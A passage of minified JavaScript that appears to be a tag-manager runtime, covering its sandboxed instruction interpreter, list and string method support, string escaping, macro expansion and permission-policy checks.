                x[y] = J(this.evaluate(x[y]), b, c);
              return f((0, this.F.H)(g, g, x));
            });
            return d.set(g, q), e(g, q), q;
          }
          var v = typeof g;
          if (null === g || "string" === v || "number" === v || "boolean" === v)
            return g;
          var w = !1;
          switch (c) {
            case 1:
              w = !0;
              break;
            case 2:
              w = !1;
          }
          return void 0 !== g && w ? new cd(g) : void 0;
        };
      return f(a);
    }
    var hd = {
        supportedMethods:
          "concat every filter forEach hasOwnProperty indexOf join lastIndexOf map pop push reduce reduceRight reverse shift slice some sort splice unshift toString".split(
            " "
          ),
        concat: function (a) {
          for (var b = [], c = 0; c < this.length(); c++) b.push(this.get(c));
          for (var d = 1; d < arguments.length; d++)
            if (arguments[d] instanceof Wa)
              for (var e = arguments[d], f = 0; f < e.length(); f++)
                b.push(e.get(f));
            else b.push(arguments[d]);
          return new Wa(b);
        },
        every: function (a, b) {
          for (var c = this.length(), d = 0; d < this.length() && d < c; d++)
            if (this.has(d) && !b.invoke(a, this.get(d), d, this)) return !1;
          return !0;
        },
        filter: function (a, b) {
          for (
            var c = this.length(), d = [], e = 0;
            e < this.length() && e < c;
            e++
          )
            this.has(e) &&
              b.invoke(a, this.get(e), e, this) &&
              d.push(this.get(e));
          return new Wa(d);
        },
        forEach: function (a, b) {
          for (var c = this.length(), d = 0; d < this.length() && d < c; d++)
            this.has(d) && b.invoke(a, this.get(d), d, this);
        },
        hasOwnProperty: function (a, b) {
          return this.has(b);
        },
        indexOf: function (a, b, c) {
          var d = this.length(),
            e = void 0 === c ? 0 : Number(c);
          e < 0 && (e = Math.max(d + e, 0));
          for (var f = e; f < d; f++)
            if (this.has(f) && this.get(f) === b) return f;
          return -1;
        },
        join: function (a, b) {
          for (var c = [], d = 0; d < this.length(); d++) c.push(this.get(d));
          return c.join(b);
        },
        lastIndexOf: function (a, b, c) {
          var d = this.length(),
            e = d - 1;
          void 0 !== c && (e = c < 0 ? d + c : Math.min(c, e));
          for (var f = e; f >= 0; f--)
            if (this.has(f) && this.get(f) === b) return f;
          return -1;
        },
        map: function (a, b) {
          for (
            var c = this.length(), d = [], e = 0;
            e < this.length() && e < c;
            e++
          )
            this.has(e) && (d[e] = b.invoke(a, this.get(e), e, this));
          return new Wa(d);
        },
        pop: function () {
          return this.pop();
        },
        push: function (a) {
          return this.push.apply(
            this,
            Array.prototype.slice.call(arguments, 1)
          );
        },
        reduce: function (a, b, c) {
          var e,
            d = this.length(),
            f = 0;
          if (void 0 !== c) e = c;
          else {
            if (0 === d)
              throw Error("TypeError: Reduce on List with no elements.");
            for (var g = 0; g < d; g++)
              if (this.has(g)) {
                (e = this.get(g)), (f = g + 1);
                break;
              }
            if (g === d)
              throw Error("TypeError: Reduce on List with no elements.");
          }
          for (var k = f; k < d; k++)
            this.has(k) && (e = b.invoke(a, e, this.get(k), k, this));
          return e;
        },
        reduceRight: function (a, b, c) {
          var e,
            d = this.length(),
            f = d - 1;
          if (void 0 !== c) e = c;
          else {
            if (0 === d)
              throw Error("TypeError: ReduceRight on List with no elements.");
            for (var g = 1; g <= d; g++)
              if (this.has(d - g)) {
                (e = this.get(d - g)), (f = d - (g + 1));
                break;
              }
            if (g > d)
              throw Error("TypeError: ReduceRight on List with no elements.");
          }
          for (var k = f; k >= 0; k--)
            this.has(k) && (e = b.invoke(a, e, this.get(k), k, this));
          return e;
        },
        reverse: function () {
          for (var a = Ya(this), b = a.length - 1, c = 0; b >= 0; b--, c++)
            a.hasOwnProperty(b) ? this.set(c, a[b]) : Xa(this, c);
          return this;
        },
        shift: function () {
          return this.shift();
        },
        slice: function (a, b, c) {
          var d = this.length();
          void 0 === b && (b = 0),
            (b = b < 0 ? Math.max(d + b, 0) : Math.min(b, d)),
            (c =
              void 0 === c ? d : c < 0 ? Math.max(d + c, 0) : Math.min(c, d)),
            (c = Math.max(b, c));
          for (var e = [], f = b; f < c; f++) e.push(this.get(f));
          return new Wa(e);
        },
        some: function (a, b) {
          for (var c = this.length(), d = 0; d < this.length() && d < c; d++)
            if (this.has(d) && b.invoke(a, this.get(d), d, this)) return !0;
          return !1;
        },
        sort: function (a, b) {
          var c = Ya(this);
          void 0 === b
            ? c.sort()
            : c.sort(function (e, f) {
                return Number(b.invoke(a, e, f));
              });
          for (var d = 0; d < c.length; d++)
            c.hasOwnProperty(d) ? this.set(d, c[d]) : Xa(this, d);
          return this;
        },
        splice: function (a, b, c) {
          return this.splice.apply(
            this,
            Array.prototype.splice.call(arguments, 1, arguments.length - 1)
          );
        },
        toString: function () {
          return this.toString();
        },
        unshift: function (a) {
          return this.unshift.apply(
            this,
            Array.prototype.slice.call(arguments, 1)
          );
        },
      },
      id = function (a) {
        var b;
        (b = Error.call(this, a)),
          (this.message = b.message),
          "stack" in b && (this.stack = b.stack);
      };
    xa(id, Error);
    var jd = {
        charAt: 1,
        concat: 1,
        indexOf: 1,
        lastIndexOf: 1,
        match: 1,
        replace: 1,
        search: 1,
        slice: 1,
        split: 1,
        substring: 1,
        toLowerCase: 1,
        toLocaleLowerCase: 1,
        toString: 1,
        toUpperCase: 1,
        toLocaleUpperCase: 1,
        trim: 1,
      },
      kd = new Ca("break"),
      ld = new Ca("continue");
    function md(a, b) {
      return this.evaluate(a) + this.evaluate(b);
    }
    function nd(a, b) {
      return this.evaluate(a) && this.evaluate(b);
    }
    function od(a, b, c) {
      if (
        ((a = this.evaluate(a)),
        (b = this.evaluate(b)),
        !((c = this.evaluate(c)) instanceof Wa))
      )
        throw Error("Error: Non-List argument given to Apply instruction.");
      if (null == a) {
        var d = "TypeError: Can't read property " + b + " of " + a + ".";
        throw Error(d);
      }
      var e = "number" == typeof a;
      if ("boolean" == typeof a || e) {
        if ("toString" === b) {
          if (e && c.length()) {
            var f = J(c.get(0));
            try {
              return a.toString(f);
            } catch (y) {}
          }
          return a.toString();
        }
        var g = "TypeError: " + a + "." + b + " is not a function.";
        throw Error(g);
      }
      if ("string" == typeof a) {
        if (jd.hasOwnProperty(b)) {
          1;
          var m = J(c, void 0, 1);
          return fd(a[b].apply(a, m), this.F);
        }
        var n = "TypeError: " + b + " is not a function";
        throw Error(n);
      }
      if (a instanceof Wa) {
        if (a.has(b)) {
          var p = a.get(b);
          if (p instanceof Yc) {
            var q = Ya(c);
            return q.unshift(this.F), p.invoke.apply(p, q);
          }
          var r = "TypeError: " + b + " is not a function";
          throw Error(r);
        }
        if (hd.supportedMethods.indexOf(b) >= 0) {
          var t = Ya(c);
          return t.unshift(this.F), hd[b].apply(a, t);
        }
      }
      if (a instanceof Yc || a instanceof Za) {
        if (a.has(b)) {
          var u = a.get(b);
          if (u instanceof Yc) {
            var v = Ya(c);
            return v.unshift(this.F), u.invoke.apply(u, v);
          }
          var w = "TypeError: " + b + " is not a function";
          throw Error(w);
        }
        if ("toString" === b)
          return a instanceof Yc ? a.getName() : a.toString();
        if ("hasOwnProperty" === b) return a.has.apply(a, Ya(c));
      }
      if (a instanceof cd && "toString" === b) return a.toString();
      var x = "TypeError: Object has no '" + b + "' property.";
      throw Error(x);
    }
    function pd(a, b) {
      if ("string" != typeof (a = this.evaluate(a)))
        throw Error("Invalid key name given for assignment.");
      var c = this.F;
      if (!c.has(a))
        throw Error("Attempting to assign to undefined value " + b);
      var d = this.evaluate(b);
      return c.set(a, d), d;
    }
    function qd() {
      var b = Ja(Ia(this.F), Array.prototype.slice.apply(arguments));
      if (b instanceof Ca) return b;
    }
    function rd() {
      return kd;
    }
    function sd(a) {
      for (var b = this.evaluate(a), c = 0; c < b.length; c++) {
        var d = this.evaluate(b[c]);
        if (d instanceof Ca) return d;
      }
    }
    function vd() {
      for (var a = this.F, b = 0; b < arguments.length - 1; b += 2) {
        var c = arguments[b];
        if ("string" == typeof c) {
          var d = this.evaluate(arguments[b + 1]);
          Ha(a, c, d, !0);
        }
      }
    }
    function wd() {
      return ld;
    }
    function xd(a, b) {
      return new Ca(a, this.evaluate(b));
    }
    function yd(a, b) {
      var c = new Wa();
      b = this.evaluate(b);
      for (var d = 0; d < b.length; d++) c.push(b[d]);
      var e = [51, a, c].concat(
        Array.prototype.splice.call(arguments, 2, arguments.length - 2)
      );
      this.F.add(a, this.evaluate(e));
    }
    function zd(a, b) {
      return this.evaluate(a) / this.evaluate(b);
    }
    function Ad(a, b) {
      (a = this.evaluate(a)), (b = this.evaluate(b));
      var c = a instanceof cd,
        d = b instanceof cd;
      return c || d ? !(!c || !d) && a.getValue() === b.getValue() : a == b;
    }
    function Bd() {
      for (var a, b = 0; b < arguments.length; b++)
        a = this.evaluate(arguments[b]);
      return a;
    }
    function Cd(a, b, c, d) {
      for (var e = 0; e < b(); e++) {
        var g = Ja(a(c(e)), d);
        if (g instanceof Ca) {
          if ("break" === g.type) break;
          if ("return" === g.type) return g;
        }
      }
    }
    function Dd(a, b, c) {
      if ("string" == typeof b)
        return Cd(
          a,
          function () {
            return b.length;
          },
          function (f) {
            return f;
          },
          c
        );
      if (b instanceof Za || b instanceof Wa || b instanceof Yc) {
        var d = b.Pb(),
          e = d.length();
        return Cd(
          a,
          function () {
            return e;
          },
          function (f) {
            return d.get(f);
          },
          c
        );
      }
    }
    function Ed(a, b, c) {
      (a = this.evaluate(a)), (b = this.evaluate(b)), (c = this.evaluate(c));
      var d = this.F;
      return Dd(
        function (e) {
          return d.set(a, e), d;
        },
        b,
        c
      );
    }
    function Fd(a, b, c) {
      (a = this.evaluate(a)), (b = this.evaluate(b)), (c = this.evaluate(c));
      var d = this.F;
      return Dd(
        function (e) {
          var f = Ia(d);
          return Ha(f, a, e, !0), f;
        },
        b,
        c
      );
    }
    function Gd(a, b, c) {
      (a = this.evaluate(a)), (b = this.evaluate(b)), (c = this.evaluate(c));
      var d = this.F;
      return Dd(
        function (e) {
          var f = Ia(d);
          return f.add(a, e), f;
        },
        b,
        c
      );
    }
    function Hd(a, b, c) {
      (a = this.evaluate(a)), (b = this.evaluate(b)), (c = this.evaluate(c));
      var d = this.F;
      return Id(
        function (e) {
          return d.set(a, e), d;
        },
        b,
        c
      );
    }
    function Jd(a, b, c) {
      (a = this.evaluate(a)), (b = this.evaluate(b)), (c = this.evaluate(c));
      var d = this.F;
      return Id(
        function (e) {
          var f = Ia(d);
          return Ha(f, a, e, !0), f;
        },
        b,
        c
      );
    }
    function Kd(a, b, c) {
      (a = this.evaluate(a)), (b = this.evaluate(b)), (c = this.evaluate(c));
      var d = this.F;
      return Id(
        function (e) {
          var f = Ia(d);
          return f.add(a, e), f;
        },
        b,
        c
      );
    }
    function Id(a, b, c) {
      if ("string" == typeof b)
        return Cd(
          a,
          function () {
            return b.length;
          },
          function (d) {
            return b[d];
          },
          c
        );
      if (b instanceof Wa)
        return Cd(
          a,
          function () {
            return b.length();
          },
          function (d) {
            return b.get(d);
          },
          c
        );
      throw new TypeError("The value is not iterable.");
    }
    function Ld(a, b, c, d) {
      function e(p, q) {
        for (var r = 0; r < f.length(); r++) {
          var t = f.get(r);
          q.add(t, p.get(t));
        }
      }
      var f = this.evaluate(a);
      if (!(f instanceof Wa))
        throw Error(
          "TypeError: Non-List argument given to ForLet instruction."
        );
      var g = this.F;
      d = this.evaluate(d);
      var k = Ia(g);
      for (e(g, k); Ka(k, b); ) {
        var m = Ja(k, d);
        if (m instanceof Ca) {
          if ("break" === m.type) break;
          if ("return" === m.type) return m;
        }
        var n = Ia(g);
        e(k, n), Ka(n, c), (k = n);
      }
    }
    function Md(a, b) {
      var c = this.F,
        d = this.evaluate(b);
      if (!(d instanceof Wa))
        throw Error("Error: non-List value given for Fn argument names.");
      var e = Array.prototype.slice.call(arguments, 2);
      return new Yc(a, function (f) {
        var g = Ia(c);
        void 0 === g.j && (g.j = this.F.j);
        for (
          var k = Array.prototype.slice.call(arguments, 0), m = 0;
          m < k.length;
          m++
        )
          if (((k[m] = this.evaluate(k[m])), k[m] instanceof Ca)) return k[m];
        for (var n = d.get("length"), p = 0; p < n; p++)
          p < k.length ? g.add(d.get(p), k[p]) : g.add(d.get(p), void 0);
        g.add("arguments", new Wa(k));
        var q = Ja(g, e);
        if (q instanceof Ca) return "return" === q.type ? q.data : q;
      });
    }
    function Nd(a) {
      a = this.evaluate(a);
      var b = this.F;
      if (Od && !b.has(a)) throw new ReferenceError(a + " is not defined.");
      return b.get(a);
    }
    function Pd(a, b) {
      var c;
      if (((a = this.evaluate(a)), (b = this.evaluate(b)), null == a)) {
        var d =
          "TypeError: Cannot read properties of " +
          a +
          " (reading '" +
          b +
          "')";
        throw Error(d);
      }
      if (a instanceof Za || a instanceof Wa || a instanceof Yc) c = a.get(b);
      else if ("string" == typeof a)
        "length" === b ? (c = a.length) : Va(b) && (c = a[b]);
      else if (a instanceof cd) return;
      return c;
    }
    function Qd(a, b) {
      return this.evaluate(a) > this.evaluate(b);
    }
    function Rd(a, b) {
      return this.evaluate(a) >= this.evaluate(b);
    }
    function Sd(a, b) {
      return (
        (a = this.evaluate(a)),
        (b = this.evaluate(b)),
        a instanceof cd && (a = a.getValue()),
        b instanceof cd && (b = b.getValue()),
        a === b
      );
    }
    function Td(a, b) {
      return !Sd.call(this, a, b);
    }
    function Ud(a, b, c) {
      var d = [];
      this.evaluate(a) ? (d = this.evaluate(b)) : c && (d = this.evaluate(c));
      var e = Ja(this.F, d);
      if (e instanceof Ca) return e;
    }
    var Od = !1;
    function Vd(a, b) {
      return this.evaluate(a) < this.evaluate(b);
    }
    function Wd(a, b) {
      return this.evaluate(a) <= this.evaluate(b);
    }
    function Xd() {
      for (var a = new Wa(), b = 0; b < arguments.length; b++) {
        var c = this.evaluate(arguments[b]);
        a.push(c);
      }
      return a;
    }
    function Yd() {
      for (var a = new Za(), b = 0; b < arguments.length - 1; b += 2) {
        var c = this.evaluate(arguments[b]) + "",
          d = this.evaluate(arguments[b + 1]);
        a.set(c, d);
      }
      return a;
    }
    function Zd(a, b) {
      return this.evaluate(a) % this.evaluate(b);
    }
    function $d(a, b) {
      return this.evaluate(a) * this.evaluate(b);
    }
    function ae(a) {
      return -this.evaluate(a);
    }
    function be(a) {
      return !this.evaluate(a);
    }
    function ce(a, b) {
      return !Ad.call(this, a, b);
    }
    function de() {
      return null;
    }
    function ee(a, b) {
      return this.evaluate(a) || this.evaluate(b);
    }
    function fe(a, b) {
      var c = this.evaluate(a);
      return this.evaluate(b), c;
    }
    function ge(a) {
      return this.evaluate(a);
    }
    function he() {
      return Array.prototype.slice.apply(arguments);
    }
    function ie(a) {
      return new Ca("return", this.evaluate(a));
    }
    function je(a, b, c) {
      if (
        ((a = this.evaluate(a)),
        (b = this.evaluate(b)),
        (c = this.evaluate(c)),
        null == a)
      ) {
        var d = "TypeError: Can't set property " + b + " of " + a + ".";
        throw Error(d);
      }
      return (
        (a instanceof Yc || a instanceof Wa || a instanceof Za) && a.set(b, c),
        c
      );
    }
    function ke(a, b) {
      return this.evaluate(a) - this.evaluate(b);
    }
    function le(a, b, c) {
      a = this.evaluate(a);
      var d = this.evaluate(b),
        e = this.evaluate(c);
      if (!Array.isArray(d) || !Array.isArray(e))
        throw Error("Error: Malformed switch instruction.");
      for (var f, g = !1, k = 0; k < d.length; k++)
        if (g || a === this.evaluate(d[k]))
          if ((f = this.evaluate(e[k])) instanceof Ca) {
            var m = f.type;
            if ("break" === m) return;
            if ("return" === m || "continue" === m) return f;
          } else g = !0;
      if (
        e.length === d.length + 1 &&
        (f = this.evaluate(e[e.length - 1])) instanceof Ca &&
        ("return" === f.type || "continue" === f.type)
      )
        return f;
    }
    function me(a, b, c) {
      return this.evaluate(a) ? this.evaluate(b) : this.evaluate(c);
    }
    function ne(a) {
      return (a = this.evaluate(a)) instanceof Yc ? "function" : typeof a;
    }
    function oe() {
      for (var a = this.F, b = 0; b < arguments.length; b++) {
        var c = arguments[b];
        "string" != typeof c || a.add(c, void 0);
      }
    }
    function pe(a, b, c, d) {
      var e = this.evaluate(d);
      if (this.evaluate(c)) {
        var f = Ja(this.F, e);
        if (f instanceof Ca) {
          if ("break" === f.type) return;
          if ("return" === f.type) return f;
        }
      }
      for (; this.evaluate(a); ) {
        var g = Ja(this.F, e);
        if (g instanceof Ca) {
          if ("break" === g.type) break;
          if ("return" === g.type) return g;
        }
        this.evaluate(b);
      }
    }
    function qe(a) {
      return ~Number(this.evaluate(a));
    }
    function re(a, b) {
      return Number(this.evaluate(a)) << Number(this.evaluate(b));
    }
    function se(a, b) {
      return Number(this.evaluate(a)) >> Number(this.evaluate(b));
    }
    function te(a, b) {
      return Number(this.evaluate(a)) >>> Number(this.evaluate(b));
    }
    function ue(a, b) {
      return Number(this.evaluate(a)) & Number(this.evaluate(b));
    }
    function ve(a, b) {
      return Number(this.evaluate(a)) ^ Number(this.evaluate(b));
    }
    function we(a, b) {
      return Number(this.evaluate(a)) | Number(this.evaluate(b));
    }
    function xe() {}
    function ye(a, b, c, d, e) {
      var f = !0;
      try {
        var g = this.evaluate(c);
        if (g instanceof Ca) return g;
      } catch (r) {
        if (!(r instanceof id && a)) throw ((f = r instanceof id), r);
        var k = Ia(this.F),
          m = new cd(r);
        k.add(b, m);
        var p = Ja(k, this.evaluate(d));
        if (p instanceof Ca) return p;
      } finally {
        if (f && void 0 !== e) {
          var q = this.evaluate(e);
          if (q instanceof Ca) return q;
        }
      }
    }
    var Ce = function () {
      (this.D = !1), (this.j = new La()), Be(this), (this.D = !0);
    };
    Ce.prototype.execute = function (a) {
      return De(this.j.Vh(a));
    };
    Ce.prototype.La = function () {
      this.j.La();
    };
    var Be = function (a) {
      var b = function (c, d) {
        var e = String(c),
          f = new Yc(e, d);
        f.La(), a.j.j.set(e, f);
      };
      b(0, md),
        b(1, nd),
        b(2, od),
        b(3, pd),
        b(56, ue),
        b(57, re),
        b(58, qe),
        b(59, we),
        b(60, se),
        b(61, te),
        b(62, ve),
        b(53, qd),
        b(4, rd),
        b(5, sd),
        b(52, vd),
        b(6, wd),
        b(49, xd),
        b(7, Xd),
        b(8, Yd),
        b(9, sd),
        b(50, yd),
        b(10, zd),
        b(12, Ad),
        b(13, Bd),
        b(51, Md),
        b(47, Ed),
        b(54, Fd),
        b(55, Gd),
        b(63, Ld),
        b(64, Hd),
        b(65, Jd),
        b(66, Kd),
        b(15, Nd),
        b(16, Pd),
        b(17, Pd),
        b(18, Qd),
        b(19, Rd),
        b(20, Sd),
        b(21, Td),
        b(22, Ud),
        b(23, Vd),
        b(24, Wd),
        b(25, Zd),
        b(26, $d),
        b(27, ae),
        b(28, be),
        b(29, ce),
        b(45, de),
        b(30, ee),
        b(32, fe),
        b(33, fe),
        b(34, ge),
        b(35, ge),
        b(46, he),
        b(36, ie),
        b(43, je),
        b(37, ke),
        b(38, le),
        b(39, me),
        b(67, ye),
        b(40, ne),
        b(44, xe),
        b(41, oe),
        b(42, pe);
    };
    function De(a) {
      if (
        a instanceof Ca ||
        a instanceof Yc ||
        a instanceof Wa ||
        a instanceof Za ||
        a instanceof cd ||
        null == a ||
        "string" == typeof a ||
        "number" == typeof a ||
        "boolean" == typeof a
      )
        return a;
    }
    Ce.prototype.ud = function () {
      return this.j.ud();
    };
    var Fe = function (a) {
      this.message = a;
    };
    function Ge(a) {
      var b =
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[a];
      return void 0 === b
        ? new Fe(
            "Value " + a + " can not be encoded in web-safe base64 dictionary."
          )
        : b;
    }
    function He(a) {
      switch (a) {
        case 1:
          return "1";
        case 2:
        case 4:
          return "0";
        default:
          return "-";
      }
    }
    var Ie = /^[1-9a-zA-Z_-][1-9a-c][1-9a-v]\d$/;
    function Je(a, b) {
      for (var c = "", d = !0; a > 7; ) {
        var e = 31 & a;
        (a >>= 5), d ? (d = !1) : (e |= 32), (c = "" + Ge(e) + c);
      }
      return (a <<= 2), d || (a |= 32), "" + Ge(a | b) + c;
    }
    var Ke = (function () {
        function a(b) {
          return {
            toString: function () {
              return b;
            },
          };
        }
        return {
          yk: a("consent"),
          ii: a("convert_case_to"),
          ji: a("convert_false_to"),
          ki: a("convert_null_to"),
          li: a("convert_true_to"),
          mi: a("convert_undefined_to"),
          sn: a("debug_mode_metadata"),
          oa: a("function"),
          Tg: a("instance_name"),
          Xk: a("live_only"),
          Yk: a("malware_disabled"),
          Zk: a("metadata"),
          fl: a("original_activity_id"),
          Bn: a("original_vendor_template_id"),
          An: a("once_on_load"),
          bl: a("once_per_event"),
          vj: a("once_per_load"),
          Dn: a("priority_override"),
          En: a("respected_consent_types"),
          Dj: a("setup_tags"),
          ve: a("tag_id"),
          Jj: a("teardown_tags"),
        };
      })(),
      Le = [],
      Ue = /[\x00\x08-\x0d\x22\x26\x27\/\x3c-\x3e\\\x85\u2028\u2029]/g,
      Ve = {
        "\0": "\\x00",
        "\b": "\\x08",
        "\t": "\\t",
        "\n": "\\n",
        "\v": "\\x0b",
        "\f": "\\f",
        "\r": "\\r",
        '"': "\\x22",
        "&": "\\x26",
        "'": "\\x27",
        "/": "\\/",
        "<": "\\x3c",
        "=": "\\x3d",
        ">": "\\x3e",
        "\\": "\\\\",
        "": "\\x85",
        "\u2028": "\\u2028",
        "\u2029": "\\u2029",
        $: "\\x24",
        "(": "\\x28",
        ")": "\\x29",
        "*": "\\x2a",
        "+": "\\x2b",
        ",": "\\x2c",
        "-": "\\x2d",
        ".": "\\x2e",
        ":": "\\x3a",
        "?": "\\x3f",
        "[": "\\x5b",
        "]": "\\x5d",
        "^": "\\x5e",
        "{": "\\x7b",
        "|": "\\x7c",
        "}": "\\x7d",
      },
      We = function (a) {
        return Ve[a];
      };
    Le[8] = function (a) {
      if (null == a) return " null ";
      switch (typeof a) {
        case "boolean":
        case "number":
          return " " + a + " ";
        default:
          return "'" + String(String(a)).replace(Ue, We) + "'";
      }
    };
    var hf;
    Le[16] = function (a) {
      return a;
    };
    var pf,
      qf,
      jf = [],
      kf = [],
      lf = [],
      mf = [],
      nf = [],
      of = {};
    var tf,
      uf = [],
      vf = [];
    function wf(a, b) {
      var c = {};
      for (var d in ((c[Ke.oa] = "__" + a), b))
        b.hasOwnProperty(d) && (c["vtp_" + d] = b[d]);
      return c;
    }
    function xf(a, b, c) {
      try {
        return pf(yf(a, b, c));
      } catch (d) {
        JSON.stringify(a);
      }
      return 2;
    }
    function zf(a) {
      var b = a[Ke.oa];
      if (!b) throw Error("Error: No function name given for function call.");
      return !!of[b];
    }
    var yf = function (a, b, c) {
        c = c || [];
        var e,
          d = {};
        for (e in a) a.hasOwnProperty(e) && (d[e] = Af(a[e], b, c));
        return d;
      },
      Af = function (a, b, c) {
        var d;
        if (Array.isArray(a))
          switch (a[0]) {
            case "function_id":
              return a[1];
            case "list":
              d = [];
              for (var e = 1; e < a.length; e++) d.push(Af(a[e], b, c));
              return d;
            case "macro":
              var f = a[1];
              if (c[f]) return;
              var g = jf[f];
              if (!g || b.isBlocked(g)) return;
              c[f] = !0;
              var k = String(g[Ke.Tg]);
              try {
                var m = yf(g, b, c);
                (m.vtp_gtmEventId = b.id),
                  b.priorityId && (m.vtp_gtmPriorityId = b.priorityId),
                  (d = Bf(m, { event: b, index: f, type: 2, name: k })),
                  tf && (d = tf.yl(d, m));
              } catch (y) {
                b.logMacroError && b.logMacroError(y, Number(f), k), (d = !1);
              }
              return (c[f] = !1), d;
            case "map":
              d = {};
              for (var n = 1; n < a.length; n += 2)
                d[Af(a[n], b, c)] = Af(a[n + 1], b, c);
              return d;
            case "template":
              d = [];
              for (var p = !1, q = 1; q < a.length; q++) {
                var r = Af(a[q], b, c);
                qf && (p = p || qf.km(r)), d.push(r);
              }
              return qf && p ? qf.Bl(d) : d.join("");
            case "escape":
              if (
                ((d = Af(a[1], b, c)),
                qf && Array.isArray(a[1]) && "macro" === a[1][0] && qf.lm(a))
              )
                return qf.Jm(d);
              d = String(d);
              for (var t = 2; t < a.length; t++) Le[a[t]] && (d = Le[a[t]](d));
              return d;
            case "tag":
              var u = a[1];
              if (!mf[u])
                throw Error("Unable to resolve tag reference " + u + ".");
              return { Qj: a[2], index: u };
            case "zb":
              var v = { arg0: a[2], arg1: a[3], ignore_case: a[5] };
              v[Ke.oa] = a[1];
              var w = xf(v, b, c),
                x = !!a[4];
              return x || 2 !== w ? x !== (1 === w) : null;
            default:
              throw Error(
                "Attempting to expand unknown Value type: " + a[0] + "."
              );
          }
        return a;
      },
      Bf = function (a, b) {
        var c = a[Ke.oa],
          d = b && b.event;
        if (!c) throw Error("Error: No function name given for function call.");
        var m,
          u,
          v,
          w,
          e = of[c],
          f =
            b &&
            2 === b.type &&
            (null == d ? void 0 : d.reportMacroDiscrepancy) &&
            e &&
            -1 !== uf.indexOf(c),
          g = {},
          k = {};
        for (m in a)
          a.hasOwnProperty(m) &&
            Hb(m, "vtp_") &&
            (e && (g[m] = a[m]), !e || f) &&
            (k[m.substring(4)] = a[m]);
        if (
          (e &&
            d &&
            d.cachedModelValues &&
            (g.vtp_gtmCachedValues = d.cachedModelValues),
          b)
        ) {
          if (null == b.name) {
            var n;
            a: {
              var p = b.type,
                q = b.index;
              if (null == q) n = "";
              else {
                var r;
                switch (p) {
                  case 2:
                    r = jf[q];
                    break;
                  case 1:
                    r = mf[q];
                    break;
                  default:
                    n = "";
                    break a;
                }
                var t = r && r[Ke.Tg];
                n = t ? String(t) : "";
              }
            }
            b.name = n;
          }
          e &&
            ((g.vtp_gtmEntityIndex = b.index), (g.vtp_gtmEntityName = b.name));
        }
        if (f && -1 === vf.indexOf(c)) {
          vf.push(c);
          var x = Cb();
          u = e(g);
          var y = Cb() - x,
            B = Cb();
          (v = hf(c, k, b)), (w = y - (Cb() - B));
        } else e && (u = e(g)), (!e || f) && (v = hf(c, k, b));
        return (
          f &&
            d &&
            (d.reportMacroDiscrepancy(d.id, c, void 0, !0),
            Ua(u)
              ? (Array.isArray(u)
                  ? Array.isArray(v)
                  : Ta(u)
                  ? Ta(v)
                  : "function" == typeof u
                  ? "function" == typeof v
                  : u === v) || d.reportMacroDiscrepancy(d.id, c)
              : u !== v && d.reportMacroDiscrepancy(d.id, c),
            void 0 !== w && d.reportMacroDiscrepancy(d.id, c, w)),
          e ? u : v
        );
      },
      Cf = function (a, b, c) {
        var d;
        (d = Error.call(this, c)),
          (this.message = d.message),
          "stack" in d && (this.stack = d.stack),
          (this.permissionId = a),
          (this.parameters = b),
          (this.name = "PermissionError");
      };
    function Df(a, b) {
      if (Array.isArray(a)) {
        Object.defineProperty(a, "context", { value: { line: b[0] } });
        for (var c = 1; c < a.length; c++) Df(a[c], b[c]);
      }
    }
    xa(Cf, Error);
    var Ef = function (a, b) {
      var c;
      (c = Error.call(
        this,
        "Wrapped error for Dust debugging. Original error message: " + a.message
      )),
        (this.message = c.message),
        "stack" in c && (this.stack = c.stack),
        (this.Dm = a),
        (this.j = []),
        (this.D = b);
    };
    function Gf(a) {
      if (!a.length) return a;
      a.push({ id: "main", line: 0 });
      for (var b = a.length - 1; b > 0; b--) qb(a[b].id) && a.splice(b++, 1);
      for (var c = a.length - 1; c > 0; c--) a[c].line = a[c - 1].line;
      return a.splice(0, 1), a;
    }
    function Hf(a) {
      function b(r) {
        for (var t = 0; t < r.length; t++) d[r[t]] = !0;
      }
      for (
        var c = [],
          d = [],
          e = (function If(a) {
            var b = [];
            return function (c) {
              return void 0 === b[c] && (b[c] = xf(lf[c], a)), b[c];
            };
          })(a),
          f = 0;
        f < kf.length;
        f++
      ) {
        var g = kf[f],
          k = Jf(g, e);
        if (k) {
          for (var m = g.add || [], n = 0; n < m.length; n++) c[m[n]] = !0;
          b(g.block || []);
        } else null === k && b(g.block || []);
      }
      for (var p = [], q = 0; q < mf.length; q++) c[q] && !d[q] && (p[q] = !0);
      return p;
    }
    function Jf(a, b) {
      for (var c = a.if || [], d = 0; d < c.length; d++) {
        var e = b(c[d]);
        if (0 === e) return !1;
        if (2 === e) return null;
      }
      for (var f = a.unless || [], g = 0; g < f.length; g++) {
        var k = b(f[g]);
        if (2 === k) return null;
        if (1 === k) return !1;
      }
      return !0;
    }
    xa(Ef, Error);
    var Kf = {
        yl: function (a, b) {
          return (
            b[Ke.ii] &&
              "string" == typeof a &&
              (a = 1 === b[Ke.ii] ? a.toLowerCase() : a.toUpperCase()),
            b.hasOwnProperty(Ke.ki) && null === a && (a = b[Ke.ki]),
            b.hasOwnProperty(Ke.mi) && void 0 === a && (a = b[Ke.mi]),
            b.hasOwnProperty(Ke.li) && !0 === a && (a = b[Ke.li]),
            b.hasOwnProperty(Ke.ji) && !1 === a && (a = b[Ke.ji]),
            a
          );
        },
      },
      Lf = function () {
        this.j = {};
      };
    function Of(a, b, c, d) {
      if (a)
        for (var e = 0; e < a.length; e++) {
          var f = void 0,
            g = "A policy function denied the permission request";
          try {
            (f = a[e](b, c, d)), (g += ".");
          } catch (k) {
            g =
              "string" == typeof k
                ? g + ": " + k
                : k instanceof Error
                ? g + ": " + k.message
                : g + ".";
          }
          if (!f) throw new Cf(c, d, g);
        }
    }
    var Tf = function () {
        var a = data.permissions || {},
          b = Qf.ctid,
          c = this;
        (this.j = {}), (this.D = new Lf());
        var d = {},
          e = {},
          f = (function Pf(a, b, c) {
            return function () {
              var d = arguments[0];
              if (d) {
                var e = a.j[d],
                  f = a.j.all;
                if (e || f) {
                  var g = c.apply(
                    void 0,
                    Array.prototype.slice.call(arguments, 0)
                  );
                  Of(e, b, d, g), Of(f, b, d, g);
                }
              }
            };
          })(this.D, b, function () {
            var g = arguments[0];
            return g && d[g]
              ? d[g].apply(void 0, Array.prototype.slice.call(arguments, 0))
              : {};
          });
        z(a, function (g, k) {
          function m(p) {
            var q = za.apply(1, arguments);
            if (!n[p])
              throw Rf(
                p,
                {},
                "The requested additional permission " +
                  p +
                  " is not configured."
              );
            f.apply(null, [p].concat(pa(q)));
          }
